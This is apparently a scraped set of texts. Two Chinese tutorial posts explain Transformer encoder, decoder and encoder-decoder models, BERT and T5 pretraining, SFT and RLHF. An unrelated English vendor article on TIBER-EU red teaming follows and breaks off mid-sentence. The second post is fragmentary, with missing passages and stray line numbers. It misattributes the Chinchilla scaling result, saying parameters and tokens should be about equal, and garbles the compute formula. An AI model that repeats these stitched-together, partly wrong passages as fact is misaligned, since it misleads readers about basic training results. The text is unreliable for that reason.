items.title: 从零开始的LLM 13.LLM模型及训练
items.content:
前言
在
2.LLM模型及训练
中，我曾介绍过 Transformer 的三类主要架构。不过当时刚开始系统学习
LLM，关注点主要集中在 Decoder 结构，对 Encoder 和 Encoder-Decoder
的理解还不够深入。
最近在学习记忆压缩相关方法时，需要重新梳理 Encoder 和 Encoder-Decoder
架构，也因此发现了之前文章中一些理解上的疏漏。因此，这次重新整理并撰写这篇文章，对decoder简单介绍，着重于其他两种结构。
1. Transformer
1.1 Transformer 是什么
Transformer 是一种神经网络模型架构。我们在前文推导的 Multi-Head
Attention，正是 Transformer 最核心的组成部分。一个完整的 Transformer 由
Encoder（编码器）或
Decoder（解码器），以及若干归一化层与线性层共同构成。
目前主流的 Transformer 模型分为三类：
Encoder-Only
：只理解，不生成（代表：BERT）
Decoder-Only
：以生成为核心（代表：GPT、Claude）
Encoder-Decoder
：理解后再生成（代表：T5、翻译模型）
2. Encoder-Only
在 Encoder-Only 架构中，Attentioni部分只由 Self-Attention 组成。
如图所示，一个 Encoder Layer 通常由两个子结构串联组成：
Self-Attention
：输入首先经过
Self-Attention，让每个 token 根据其他 token
的信息更新自身的表示，然后通过残差连接（Residual
Connection）与原始输入相加。
FFN（Feed-Forward
Network）
：上一步得到的结果进入前馈网络进行进一步的非线性变换，再通过残差连接与输入相加。FFN
不会让不同 token 之间发生信息交互，而是
独立地处理每个
token
。经过 FFN 后，token 的数量不变，最终通过残差连接与 FFN
的输入相加。
为什么需要Attention 与 FFN 的分工？
Attention 和 FFN 在 Transformer 中承担着不同的作用。
Attention 的核心作用是信息交互。
Self-Attention
会根据 Query 和 Key 计算不同 token 之间的注意力权重，再对 Value
进行加权求和。因此，它解决的主要问题是：
当前 token 应该从其他
token 获取哪些信息，以及获取多少信息。
但 Attention
本身并不能单独完成足够复杂的非线性特征变换。
FFN 的核心作用是对每个 token
的表示进行非线性变换。
它对 Attention
混合后的信息进行进一步加工，通过非线性激活函数增强模型的特征表达能力，帮助模型学习更加复杂的语法、结构和语义关系。
两者不断交替，使 Transformer 能够逐层构建更加复杂的语义表示。
2.1 预训练任务 —— MLM
BERT 主要采用
MLM（Masked Language
Model，掩码语言模型）
进行预训练。
MLM 可以理解为一种“完形填空”任务：在文本序列中随机选择一部分
token，将其遮蔽，然后要求模型根据上下文预测这些位置原本是什么
token。
1
2
输入： I <MASK> you because you are <MASK>
目标： I love you because you are wonderful
其中，
[MASK]
是 BERT 词表中专门添加的特殊 token，与
[CLS]
、
[SEP]
、
[PAD]
等一样，都具有固定的 token ID。
需要注意的是，
并不是所有位置都参与损失计算
。只有被选中的
Mask 位置，其输出才会被送入分类层，并与对应的真实 token
计算交叉熵损失：
模型实际上会为
每个位置
输出一个
该位置
的整个词表上的概率分布**，然后使用真实
token 对应的概率计算交叉熵。
Decoder-Only（如 GPT）的预训练方式不同。
Decoder-Only 通常使用
CLM（Causal Language
Modeling，因果语言模型）
。模型在
每个位置预测下一个
token
，并通过 Causal Mask 阻止当前位置看到未来 token。
在具体训练时，BERT 随机选择每条训练语料中
15%
的
token 参与预测，但这 15% 并非全部替换为
[MASK]
，而是按如下比例处理：
处理方式
概率
目的
替换为
[MASK]
80%
核心遮蔽，驱动模型预测
替换为随机 token
10%
迫使模型保持对全部 token 的上下文表征
保持原 token 不变
10%
消除预训练与微调阶段的分布偏移
2.2 预训练任务 —— NSP
MLM 主要学习
token 级别的上下文关系
，但一些 NLP
任务还需要理解
句子之间的关系
。
例如：
问答匹配
：判断问题与回答是否匹配；
自然语言推理（NLI）
：判断一个假设是否能够由前提推出；
句子关系判断
：判断两个句子之间是否存在特定关系。
因此，BERT 在原始论文中还引入了
NSP（Next Sentence
Prediction，下一句预测）
任务。
NSP
的任务非常简单：给模型两个句子，让模型判断第二个句子是否是原始文本中紧接着第一个句子的下一句。
例如：
1
2
3
4
5
Sentence A:
I went to the cinema yesterday.
Sentence B:
The movie was very interesting.
如果 B 确实是原文中 A
的下一句，则标签为：
IsNext
，否则：
NotNext
本质上，这就是一个
带标签的二分类任务
。
BERT 使用
[CLS]
位置的最终隐层向量作为整个句对的表示，然后接入一个分类层。
可以简单理解为：NSP 是
在 BERT 的 Encoder
输出基础之上
增加一个分类任务，通过监督学习训练模型判断两个句子之间的关系。
2.3 下游任务微调
BERT
的一个重要特点是：
预训练阶段和下游任务阶段可以使用统一的输入格式。
其中最重要的两个特殊 token 是：
[CLS]
—— Classification Token
BERT 会在每个输入序列的开头加入
[CLS]
。
经过多层 Transformer Encoder 后，[CLS] 位置的隐层向量会通过
Self-Attention
与整个输入序列进行信息交互，因此可以作为整个序列的语义表示。
例如：
1
[CLS] 这部电影节奏紧凑，演员表演非常自然 [SEP]
对于文本分类、句子关系判断等任务，可以直接取
[CLS]
对应的最终隐层向量，再接入一个分类器。
[SEP]
—— Separator Token
[SEP]
用于表示句子的边界。
对于句对任务，两个句子可以拼接后一起输入：
1
[CLS] Sentence A [SEP] Sentence B [SEP]
同时，BERT 还可以使用
Segment Embedding（Token Type
Embedding）
区分两个句子：
1
2
Sentence A → Segment A
Sentence B → Segment B
这样模型可以同时获得 token、位置信息以及句子所属的 Segment 信息。
常见下游任务
句对分类
（Sentence-Pair Classification）
例如自然语言推理（NLI）、语义相似度判断等。将两个句子拼接后输入
BERT，通过
[CLS]
的最终隐层向量表示整个句对，再接入分类器得到预测结果。
单句分类
（Single-Sentence Classification）
例如情感分析、文本分类等。输入单个句子，同样取
[CLS]
的最终隐层向量作为句子的语义表示，再接入分类器进行预测。
以情感分类为例：用 BERT 判断电影评论是正面还是负面。
第一步：准备输入
将评论按照 BERT 的输入格式进行处理：
1
[CLS] 这部电影节奏紧凑，演员表演非常自然 [SEP]
第二步：增加分类头
预训练好的 BERT 可以作为基础模型，将
[CLS]
位置的最终隐层向量作为输入，接入一个分类网络进行训练。
假设 BERT 的隐藏维度为 768：
1
2
3
4
5
6
7
8
[CLS] hidden state
768维
↓
Linear(768, 2)
↓
Softmax
↓
[正面, 负面]
这里的分类网络结构通常比较简单，分类任务所需的语义特征主要由
Transformer Encoder 提取。
Loss 仅根据最终的分类结果计算。反向传播时，梯度会从分类网络继续传回
Transformer Encoder，并更新其参数；与分类网络相比，Encoder
通常采用更小的学习率，以避免破坏预训练得到的语言表示。
第三步：准备训练数据
与 BERT 的预训练相比，下游任务通常只需要规模小得多的标注数据。
例如情感分类数据：
第四步：进行微调
使用这些带标签的数据训练模型。
典型情况下，会使用较小的学习率，例如
2e-5
，训练若干个
Epoch。
这里需要注意：传统 BERT Fine-tuning
并不是只训练顶部的分类头，而是通常会
同时更新 BERT
本体和新增的分类头
。
训练过程中的梯度会
从分类头向后传播
，最终更新 BERT
的预训练参数，使其逐渐适应当前的下游任务。
第五步：推理
微调完成后，输入新的电影评论：
1
[CLS] 导演的镜头语言太生硬，故事也讲不清楚 [SEP]
模型经过 BERT Encoder 后，取
[CLS]
的隐层向量输入分类头。
模型输出：
负面: 92% 正面: 8% → 预测结果：负面 ✓
3. Decoder-Only
Decoder-Only 模型的 Attention 部分只使用
Masked
Self-Attention
。
Masked Self-Attention
：每个 token
只能关注自己以及它之前的 token，无法看到后续位置的
token。这保证了自回归生成时的信息约束——模型在预测第 (i) 个 token
时，不能“偷看”第 (i+1) 个及之后的内容。
与 Encoder-Only 模型类似，Decoder Layer 在 Attention 后同样包含
FFN（通常在现代 LLM 中称为 MLP）
，用于对 Attention
混合后的信息进行进一步的非线性变换。
3.1 预训练任务 —— CLM
Decoder-Only 模型（如 GPT）通常采用
CLM（Causal Language
Modeling，因果语言模型）
进行预训练。
CLM 的核心思路是：
给定前面的所有 token，预测下一个 token。
由于使用了 Masked Self-Attention，模型在训练时无法看到当前 token
后面的内容，因此只能根据前文进行预测。
例如：
1
2
3
输入：今天天气 → 预测：很
输入：今天天气很 → 预测：好
输入：今天天气很好 → 预测：。
在实际训练中，并不需要像上面的例子一样逐步输入。整个序列可以一次性输入模型，通过
Masked Self-Attention
保证每个位置只能看到自己及之前的内容，然后同时计算各个位置的预测结果。
3.2 SFT（Supervised
Fine-Tuning，有监督微调）
经过预训练后，LLM
已经具备较强的语言建模能力，但此时模型学习到的主要是
根据上下文预测下一个
token
，并不意味着它已经很好地掌握了“按照用户指令完成任务”的能力。
因此，通常还需要通过
SFT（Supervised
Fine-Tuning，有监督微调）
进一步训练模型，使其学习指令遵循、问答、翻译、总结等任务。
与 BERT 等 Encoder-Only 模型的下游任务微调不同，Decoder-Only LLM
通常不会针对每一种任务单独增加一个分类头，而是仍然让模型
直接生成文本
。
SFT 数据格式
标准的指令数据通常包含以下字段：
1
2
3
4
5
{
"instruction"
:
"即用户的任务指令"
,
"input"
:
"执行该指令所需的补充输入，没有则置空"
,
"output"
:
"模型应该给出的回复"
}
以翻译任务为例：
1
2
3
4
5
{
"instruction"
:
"将下列文本翻译成英文："
,
"input"
:
"今天天气真好"
,
"output"
:
"Today is a nice day!"
}
SFT 的训练格式
为了让模型学习“
根据指令生成回答
”这一模式，训练时通常会将
instruction、input 和 output 按照特定的模板组织起来。
例如：
1
\### Instruction:\n{{content}}\n\n### Response:\n
其中的
content
即为具体的用户指令。这里的用户指令不仅指
instruction
字段，而是
instruction
和
input
的拼接，即模型可以执行的一条完整指令。
在训练过程中，模型仍然采用
下一 token
预测
的方式，只是训练数据从普通文本变成了“指令 →
回答”的结构。
4. encoder-decoder
Encoder-Decoder 架构由 Encoder 和 Decoder 两部分组成。
Encoder：
每层包含 Self-Attention 和 FFN。由于没有因果掩码，Encoder 中的每个
token 都可以关注输入序列中的其他 token。
Decoder：
每层包含 Masked Self-Attention、Cross-Attention 和 FFN。
Masked Self-Attention
：对 Decoder
当前已经生成的序列进行自注意力计算，通过 Causal Mask
屏蔽未来位置，确保生成时不会看到尚未生成的 token。
Cross-Attention
：Q 来自 Decoder 当前状态，K 和 V
来自 Encoder 的输出，使 Decoder 在生成每个 token 时能够关注 Encoder
输出中的相关信息。
4.1 训练中的前向传播
Encoder-Decoder 模型需要两个输入：
Encoder 输入和 Decoder
输入
。
Encoder
输入
是我们希望模型进行
编码的内容
，而
Decoder
输入
则来自我们希望
模型生成的目标内容
。
Encoder 首先对输入序列进行
Self-Attention
。由于Self-Attention中，每个位置都可以关注整个输入序列，因此
Encoder 的输出包含完整的上下文信息。
随后，Decoder 对目标序列进行处理。训练过程中，Decoder
的输入来自目标序列，但会向右移动一位，使模型在每个位置预测下一个
token。
Decoder 的输入首先经过
Masked
Self-Attention
，
使每个位置只能看到自己以及之前的
token
。
然后进入
Cross-Attention
：
Q 来自 Decoder 当前的隐层表示；
K 和 V 来自 Encoder 的输出。
因此，Decoder 的 Masked Self-Attention 输出 在 Cross-Attention
中，可以访问 Encoder 输出中的所有 token
信息。（我们attention原理中说过，图结构是Q连向K的。）
4.2 预训练任务
T5（一个 encoder-decoder 模型）的预训练任务称为 Span Corruption。它与
BERT(encoder-only) 的 MLM 类似，但有一个关键区别：BERT 遮蔽的是单个随机
token，而 T5 遮蔽的是连续的 token 片段（Span）。
预训练的目标，是让 encoder
具备理解能力。但“理解”本身是个抽象概念，怎么定义它、怎么衡量它？
T5 的思路是：
借助 decoder 来定义 encoder 的理解能力。如果
decoder 能根据 encoder 的输出，准确还原出被遮蔽的内容，就说明 encoder
真正理解了上下文。
同时，由于 loss 是从 decoder
的输出反向传播回去的，训练过程中也会顺带训练出一个能够解析 encoder
内容的 decoder。
举例说明
原始文本：
The cat sat on the mat.
第一步：构造 encoder 输入。
用哨兵 token
替换掉文本中的连续片段：
1
The <extra_id_0> on <extra_id_1> .
经过 encoder 后，这些 token 会变成对应的 hidden
vector，并
作为 cross-attention 中的 K、V
。
第二步：构造 decoder 输入。
decoder
需要按顺序还原每个哨兵 token 对应的内容：
1
<extra_id_0> cat sat <extra_id_1> the mat.
含义是：
<extra_id_0>
对应 "cat
sat"，
<extra_id_1>
对应 "the mat"。
如果想让对应关系更明确（让看的人不产生误解），也可以改成如下作为
decoder 的输入：
1
<extra_id_0>: cat sat \n <extra_id_1>: the mat.
第三步：构造训练目标。
实际输入会在最前面加一个
<start>
作为起始 token：
1
<start> <extra_id_0> cat sat <extra_id_1> the mat.
target 则和标准的下一词训练一样，将每个词往后移一位
1
<extra_id_0> cat sat <extra_id_1> the mat
预测关系如下：
输入
预测目标
<start>
<extra_id_0>
cat
sat
<extra_id_1>
the
mat
.
最后就是正常的 loss 计算。
4.3 微调：统一到 Text-to-Text
框架
得益于 Text-to-Text 的统一框架，T5
的微调方式非常一致：无论任务类型是什么，都只需
构造对应格式的输入输出文本对
，在预训练模型上继续训练即可，无需修改任何模型结构。
预训练
和
微调
的
核心差异在于 decoder
的目标
：
预训练阶段
：decoder 的目标是解释 span
里缺了什么，借此反向定义并训练 encoder 的理解能力。
微调阶段
：decoder
的目标回归到
正常的答案生成
，即
根据具体任务要求输出结果
。
以机器翻译为例：
Encoder 输入：
1
translate English to French:
Decoder 输入：
1
<start> Good morning.
这里需要任务前缀，因为微调时模型可能需要在多个任务之间切换或训练。
然后正常地对 decoder 的输出进行下一词预测 loss 计算即可。

items.title: 2.LLM模型及训练
items.content:
前言
从零开始学习ai文章系列已完成《动手学深度学习》和《磨菇书》两本书的学习，新开的LLM系列课本来自《Happy-LLM》，但是内容和排版等个人重新进行整理，因此不会按照原来课本中的章节来写。如果哪里有错误的欢迎指正。或者不清晰的可以直接查看原文部分。
2026.9.16: 关于encoder 和 encoder-decoder
结构中更清楚的表述在“
从零开始的LLM
13.LLM模型及训练
”中查看。
《Happy-LLM》原文（课本）：https://datawhalechina.github.io/happy-llm/#/
1. Transformer
1.1 Transformer 是什么
Transformer 是一种神经网络模型架构。我们在前文推导的 Multi-Head
Attention，正是 Transformer 最核心的组成部分。一个完整的 Transformer 由
Encoder（编码器）或
Decoder（解码器），以及若干归一化层与线性层共同构成。
目前主流的 Transformer 模型分为三类：
Encoder-Only
：只理解，不生成（代表：BERT）
Decoder-Only
：以生成为核心（代表：GPT、Claude）
Encoder-Decoder
：理解后再生成（代表：T5、翻译模型）
每种架构对应一套不同的预训练范式，我们将在后续小节逐一展开。
2. Encoder-Only
2.1 BERT 模型架构
BERT 的主体结构是将多个 Transformer Encoder
层堆叠而成。下面是它的整体数据流：
其主要结构如下图所示：
图看起来很乱，但是我们首先抓住
图中的主体结构BERT
model
。
Prediction Head
：
Tokenizer 与 Embedding 已在上篇文章详述，此处略过。Prediction Head
的结构取决于下游任务。以分类任务为例，prediction_heads
层就是多个线性层加上激活函数，最后一个线性层的输出维度和任务的类别数相等。但
Encoder-Only 模型同样广泛用于序列标注、问答、语义检索等场景，Prediction
Head 的形态也随之不同。
Encoder Layer 内部结构
Encoder是由许多的Encoder layer层构建而成的。Encoder
layer的构建如下
每个 Encoder Layer 由两个子结构串联而成：
Attention部分：输入经过 Attention

4.1 GPT 模型介绍
Decoder-Only 是目前大语言模型（LLM）的主流基础架构，当前几乎所有主流
LLM 均采用这一结构（RWKV、Mamba 等非 Transformer 架构除外）。引发 LLM

4.2 预训练任务——CLM
什么是 CLM
GPT 采用的预训练任务是
因果语言模型（Causal Language
Model，CLM）
，也是最经典、最直接的语言模型预训练目标。
CLM 的核心思路是：
给定序列中前面所有的 token，预测下一个
token
，不断重复该过程生成目标序列。这本质上是 N-gram
语言模型的深度学习扩展版——N-gram 只看前 N 个词，CLM
看前面所有词
。
例如：

2
3

input: 今天天气很 → output: 好
input: 今天天气很好 → output: 。
CLM 的训练过程
CLM 的训练只需要大量无标注文本，不需要任何人工标注。以输入
今天天气很
为例：
模型经过多层 Decoder
编码后，输出序列中每个位置都对应一个隐层向量。我们
取 "很"
所在位置的输出向量（
该向量已通过 Masked Self-Attention 融合了
今天天气很
所有前序 token 的上下文信息，详见上一章的mask
self-attention），将其经过线性层（Linear）投影到词表维度，再经 Softmax
得到词表上每个词的概率分布，最后
计算其与真实标签

1

得益于 Masked Self-Attention
的并行机制，这一过程并非逐步串行计算，而是
一次前向传播同时计算序列中所有位置的损失
，再对所有位置的损失取平均，大幅提升了训练效率。
预训练的规模
LLM 往往需要使用极大规模的预训练语料。根据 OpenAI 提出的
Scaling Law
（C≈6NDC，其中 C 为计算量，N 为模型参数量，D
为训练 token 数），Hoffmann 等人（Chinchilla,
2022）进一步实验得出：
模型参数量与训练 token
数应大致相等
才能达到最优训练效率，即 175B 的模型应使用约 175B
token 训练。而 LLaMA 则更进一步提出，使用约
20
倍
于参数量的 token 进行训练可以达到推理性能最优——175B
的模型可使用约 3.5T token 预训练以获得最优推理效果。
如此庞大的模型参数和预训练数据，使得预训练一个 LLM
所需的算力资源极其庞大。哪怕是预训练一个 1B 的模型，也至少需要多卡分布式
GPU 集群。一般来说，百亿级 LLM 需要 1024 张 A100 训练一个多月，十亿级
LLM 也需要 256 张 A100 训练两三天。
分布式训练框架
也正因如此，分布式训练框架成为 LLM
训练必不可少的组成部分，核心思路是
数据并行
和
模型并行
两种策略。
数据并行
适用于模型本身可以装入单张 GPU
显存的情况。此时将训练数据切分成多份，分发到不同 GPU 上，每张 GPU
各持一份完整的模型副本，各自用自己的数据计算梯度，再通过 AllReduce
等通信操作对所有 GPU
的梯度进行同步求平均，最终统一更新模型参数。这样既解决了单卡训练速度慢、难以使用大
batch size 的问题，又能充分利用多卡并行的算力优势。
模型并行
则针对模型本身过大、单张 GPU
无法容纳的情况，将模型参数切分到多张 GPU 上，各 GPU
只持有模型的一部分，通过卡间通信协同完成前向和反向传播。实际训练中，两种策略往往结合使用。

RLHF（Reinforcement Learning from Human

预训练
：赋予模型海量的世界知识与语言能力
对齐
：让模型与人类的价值观和期望保持一致，输出人类希望看到的内容
在对齐阶段中，SFT 解决的是"让模型听懂并遵循指令"的问题；而 RLHF
则更进一步，从深层次令模型与人类价值观对齐，使其达到
安全、有用、无害
的核心标准。
强化学习的基本思路
强化学习是有别于监督学习的另一种机器学习范式，核心问题是：
智能体如何在复杂、不确定的环境中最大化获得的累积奖励
。强化学习由两个核心要素构成：
智能体（Agent）
：做出行动的主体，在 RLHF 中即
LLM
环境（Environment）
：给出反馈的系统，在 RLHF
中即人类标注员（或奖励模型）
智能体不断行动、从环境获取反馈，再根据反馈调整策略——应用到 LLM
对齐上，就是模型不断生成回复，人类不断给出偏好反馈，模型据此学习人类更偏好的回复方式。
用一个直觉类比来理解三个训练阶段：
预训练
：把所有基础知识教给学生
SFT
：教学生怎么读题、怎么解题
RLHF
：让学生不断做练习题，老师批改并指出哪里好、哪里不好，学生据此反思和强化
RLHF 的两个步骤
RLHF 分为两个核心步骤：
训练奖励模型（RM）
和
PPO 强化学习训练
。
步骤一：训练奖励模型（Reward Model，RM）
RM 的作用是拟合人类偏好，为 LLM
的每一条回复打分，反映该回复符合人类偏好的程度。从结构上看，RM
本质上是一个文本回归模型——通常基于标准的 LLM 架构（或 BERT
架构），在最后一个 token
的隐层向量上接一个线性分类头，输出一个标量奖励值。
为什么不直接用标量标注训练 RM？
直觉上，我们可以让标注员直接给每条回复打 1～10 分，再用这些分数训练
RM。但实践中，不同标注员之间存在价值观和尺度差异——同样质量的回复，有人打
7 分，有人打 4
分——这种差异以标量形式存在时会被直接放大，导致模型难以拟合到一致的评分标准。
因此，RLHF 采用
相对排名
而非绝对打分：对同一个 prompt
下的多条回复进行两两比较，标注哪条更好。相对判断比绝对打分稳定得多，
标注员更容易对"A
比 B 好"达成共识
。
训练数据的格式通常如下：
1
2
3
4
5
{
"prompt"
:
"如果你打算从商店偷东西，你觉得早上好还是晚上好？"
,
"chosen"
:
"这是违法的事情，我不能提供建议。"
,
"rejected"
:
"考虑晚上的人流量和监控摄像头的差别是件好事。夜间时间可能更有利于避免监控摄像头，但晚上的店员会更容易注意到你……"
}
训练时，
prompt
分别与
chosen
和
rejected
拼接，各经过一次前向传播得到两个标量奖励
\(r_w\)
（chosen）和
\(r_l\)
（rejected）。损失函数的目标是
最大化两者的差距
，即让模型对
chosen 打出更高的分、对 rejected 打出更低的分：
\[
L_{RM}=−log(σ(r_w−r_l))
\]
其中 σ 是 Sigmoid 函数。直觉上，当
\(r_w > r_l\)
差距越大，损失越小；当两者得分相近甚至倒置时，损失变大，模型受到惩罚。
步骤二：PPO 强化学习训练
RM 训练完成后，进入真正的强化学习阶段，使用
PPO（Proximal
Policy Optimization，近端策略优化）
算法对 LLM 进行训练。
PPO 训练涉及四个模型：
模型
作用
是否更新参数
Actor
（策略模型）
当前正在训练的 LLM，生成回复
✅ 是
Critic
（价值模型）
估计当前状态下未来能获得的累积奖励
✅ 是
Reward Model
对 Actor 的回复打分
❌ 否（已训练好）
Reference Model
预训练/SFT 后的原始模型，用于限制偏离程度
❌ 否
PPO 的训练流程如下：
对每一个 prompt，
Actor
生成一条回复
RM
对该回复打分，得到即时奖励
为防止 Actor
为了追求高分而过度偏离原始模型（如输出奇怪但得分高的文本），将 Actor 与
Reference Model
的输出分布之间的 KL
散度作为惩罚项加入奖励：
\[
r = r_{RM} - \beta \cdot KL(\pi_{Actor} \| \pi_{Ref})
\]
Critic
估计当前策略的长期价值，辅助计算优势函数
基于以上信号，通过 PPO 算法更新 Actor 和 Critic 的参数
PPO
的核心约束在于"近端"——每次更新的步幅不能过大，避免策略突变导致训练不稳定。这也是
RLHF 中选择 PPO 而非其他强化学习算法的主要原因。
RLHF 的局限与演进：去 RL 化趋势
尽管 RLHF 是 ChatGPT
成功的重要因素，但其在工业界的实际价值正在被重新审视，"
去 RL
化
"已成为明显趋势，原因有以下几点：
人工标注成本极高
：RLHF
依赖大量高质量的人类偏好标注数据，每条数据都需要标注员对多条回复进行比较排序，成本远高于
SFT 的指令标注。
RM 能力上限限制 LLM 上限
：RM
本身是个有限容量的模型，一旦 LLM 的能力超过 RM 的判断能力，RM
就无法给出准确的奖励信号，甚至会被 LLM "欺骗"——模型学会生成能骗过 RM
但实际质量低劣的回复，即
奖励欺骗（Reward
Hacking）
。
RLHF
更多作用于风格而非智力
：大量实验表明，模型真正的推理能力、知识储备主要来自预训练，SFT
教会模型如何表达，RLHF
更多在于让模型的回复
更像助手、更安全、更符合人类偏好
，而非真正提升其智力水平。
RLAIF 作为替代方案
：为降低人工标注成本，研究者提出了
RLAIF（Reinforcement Learning from AI Feedback）
：用
GPT-4 等强模型代替人类标注员，对不同回复进行比较评分，再将这些 AI
生成的偏好数据训练小模型的
RM。这大幅降低了对齐训练的成本，且在部分任务上效果接近人工标注。

TIBER-EU and the Future of Cyber Resilience: Why Continuous Security Validation Is No Longer Optional
A point-in-time red team exercise proves resilience once. Here’s what it takes to prove it every day in between.
Summary
TIBER-EU is a European Central Bank framework that uses live, intelligence-led red team attacks to test whether financial institutions can actually withstand a real breach, not just whether their controls pass an audit.
Because a TIBER-EU exercise is a point-in-time event, continuous security validation—Breach and Attack Simulation (BAS), Adversary Exposure Validation (AEV), and Continuous Automated Red Teaming (CART)—is what keeps defenses proven in the months between exercises.
TIBER-EU also underpins DORA’s Threat-Led Penetration Testing (TLPT) requirement and works alongside the EU Cyber Resilience Act (CRA): CRA secures the products going into an environment, while TIBER-EU tests how well an organization defends those products under real attack.
Though legally binding only for EU financial institutions and critical infrastructure, TIBER-EU’s continuous-validation approach is fast becoming the global benchmark CISOs are measured against.
Author:
Tova Dvorin, Senior Product Marketing Manager
Cyber resilience has become one of the most overused—and least clearly defined—terms in security. Boards demand it. Regulators mandate it. Attackers exploit the gaps between intent and execution.
For CISOs, the frustration is familiar:
We test. We assess. We audit. But are we actually resilient?
The
European Threat Intelligence-Based Ethical Red Teaming (TIBER) framework
offers one of the clearest answers yet—and, in doing so, exposes why traditional approaches to security testing are no longer sufficient.
From Compliance to Credibility: What TIBER-EU Actually Changes
TIBER-EU was developed by the
European Central Bank
and national central banks to standardize how financial institutions and critical infrastructure providers validate
cyber resilience
.
But TIBER-EU is not “just another regulation.”
It represents a philosophical shift:
From generic testing to
threat-intelligence-led validation
From narrow control checks to
end-to-end attack simulation
From point-in-time assurance to
continuous improvement
Unlike traditional penetration testing, a TIBER-EU engagement is a full-scale, real-world attack simulation. It tests how people, processes, and technology hold up against the
actual adversaries
most likely to target the organization—not hypothetical ones.
The objective isn’t a pass/fail score. It’s learning where defenses break under real pressure.
For CISOs, Testing Does Not Equal Resilience
Most CISOs already run penetration tests, tabletop exercises, and control validations. Yet breaches still happen—and often through paths that were technically “tested.” Why?
Because most testing answers the wrong question:
Are my controls configured correctly?
TIBER-EU forces a harder one:
Can my organization withstand a targeted, persistent attack designed to bypass those controls?
That distinction matters—and it explains why regulators are increasingly aligning TIBER-EU with the
EU’s Digital Operational Resilience Act (DORA)
,
Network and Information Security Directive (NIS2)
, and broader cyber resilience initiatives.
Why TIBER-EU Exposes the Limits of Point-in-Time Testing
A TIBER-EU exercise is intensive, intelligence-driven, and highly valuable—but it is still a moment in time. Preparation can take months. Execution is complex. And the threat landscape does not pause while reports are written.
This is where many organizations struggle:
How do you prepare for a TIBER-level exercise?
How do you ensure lessons learned don’t fade six months later?
How do you maintain confidence between major regulatory tests?
The answer increasingly lies in continuous security validation.
Where Continuous Validation Fits: BAS, AEV, and CART
TIBER-EU doesn’t replace modern security validation—it
makes it necessary
.
Breach and Attack Simulation (BAS): Eliminating the Obvious Failures
BAS
platforms continuously validate whether security controls work as intended against known attacker behaviors. Think of BAS as the daily readiness check, ensuring organizations don’t fail high-stakes exercises—or real attacks—due to basic gaps or misconfigurations.
Adversary Exposure Validation (AEV): Measuring Real Risk
AEV
shifts validation from “can this control block something?” to:
Where can an attacker get in?
How far can they move once inside?
What damage can they realistically cause?
This adversary-centric view—often described in terms of
blast radius
and
blast fallout
—aligns directly with the intelligence-first philosophy at the heart of TIBER-EU.
Continuous Automated Red Teaming (CART): Making Resilience Persistent
TIBER-EU acknowledges an uncomfortable truth: attackers operate continuously.
CART
extends red-team thinking into an
always-on capability
, validating that:
Remediation actions remain effective
New configurations don’t reopen old attack paths
Defenses evolve alongside threats
In effect, CART becomes the mechanism that keeps the learning cycle alive long after a formal TIBER engagement ends.
Is TIBER-EU Relevant Outside the EU?
Legally, TIBER-EU applies primarily to European financial institutions and critical infrastructure. Strategically, its relevance is global. For CISOs in North America and beyond, TIBER-EU is best understood as a leading indicator:
Of how regulators think about resilience
Of what boards will soon expect proof of
Of how attackers already operate
The core principles—intelligence-led testing, realistic attack simulation, continuous validation—are not “European ideas.” They are operational necessities in modern security programs.
TIBER-EU as the Backbone of DORA’s TLPT Mandate
For financial entities inside the EU, TIBER-EU isn’t just a parallel framework—it’s often the mechanism regulators point to for satisfying a legal requirement.
DORA requires certain financial entities to undergo Threat-Led Penetration Testing (TLPT) every three years under Articles 26 and 27. DORA doesn’t invent a new testing methodology from scratch—it leans on TIBER-EU as the operational blueprint for how that testing should be designed, scoped, and executed.
In practice, this means:
A TIBER-EU-based test is frequently how in-scope entities demonstrate DORA compliance, not a separate exercise layered on top of it.
The same “does it hold up against a real, targeted attacker” logic behind TIBER-EU is exactly what DORA’s regulators expect to see evidenced.
Preparing for TIBER-EU and preparing for DORA’s TLPT requirement are, for most institutions, the same project.
That overlap raises the stakes on everything already covered here: if a TIBER-EU exercise is also your DORA evidence, the gap between “we tested it once” and “we can prove it continuously” isn’t just a resilience question—it’s a compliance one.
Where TIBER-EU Fits Alongside the EU Cyber Resilience Act (CRA)
As CISOs try to make sense of Europe’s expanding regulatory landscape, one question comes up repeatedly:
How does TIBER-EU relate to the EU Cyber Resilience Act (CRA), and do they overlap?
The short answer:
they address different layers of the same resilience problem.
CRA: Secure Products by Design
The
EU Cyber Resilience Act
focuses on the security of products themselves, particularly software and connected devices placed on the EU market.
Its emphasis is on:
Secure development practices
Vulnerability management and disclosure
Reducing systemic risk introduced by insecure products
CRA ultimately reinforces the expectation that the technology organizations depend on is designed, built, and maintained with security at its core.
TIBER-EU: Operational Resilience in the Real World
TIBER-EU, by contrast, assumes an uncomfortable but realistic premise: that even secure products can be misconfigured, misused, or bypassed. Rather than focusing on product assurance, TIBER-EU evaluates how organizations operate those products under attack—across people, process, and technology.
When real adversaries target an organization, the true measure of resilience is revealed in how well defenses prevent compromise, how quickly threats are detected, and how effectively teams respond under pressure. This is the standard TIBER-EU sets—and the lens through which cyber resilience must be judged.
How TIBER-EU and CRA Work Together
Seen together, CRA and TIBER-EU form a
cause-and-effect relationship
:
CRA reduces the likelihood of exploitable weaknesses entering the environment.
TIBER-EU tests what happens when attackers inevitably find a way in anyway.
This is a critical distinction for CISOs: CRA helps lower baseline risk, whereas TIBER-EU validates whether the organization can survive when baseline assumptions fail.
Why This Matters for CISOs
From a leadership perspective, CRA and TIBER-EU reinforce the same strategic reality: Cyber resilience cannot rely on any single layer—products, controls, or tests.
Even with more secure-by-design technology, risk does not disappear. New configurations can introduce unexpected weaknesses, integrations often expand the attack surface, and threat actors continue to adapt faster than standards and best practices can keep up.
That is why regulators are increasingly converging on a continuous validation mindset: one where security is not assumed, but repeatedly proven.
For CISOs, this convergence makes one thing clear:
CRA strengthens the foundation
TIBER-EU stress-tests the structure
Continuous security validation
ensures it remains standing over time
CRA may reduce the number of doors attackers can exploit—but TIBER-EU reveals what happens when they still find one open.
Why TIBER Matters Now
TIBER-EU doesn’t create new threats; it exposes old assumptions.
It makes clear that:
Annual testing cannot keep pace with daily change
Compliance does not equal resilience
Confidence requires evidence, not reports
For CISOs, the message is not “prepare for TIBER-EU.” It’s to prepare for a world where resilience must be continuously proven. That is the future regulators are moving toward—and the reality attackers already live in.
Final Thought
TIBER-EU is not the destination. It’s a forcing function and organizations that treat it as a checkbox will struggle. Those that use it to embrace continuous, adversary-centric validation will be better positioned—not just for regulators, but for the next real attack. That is the difference between testing security, and
knowing it works
.
To see how the
SafeBreach CTEM Platform
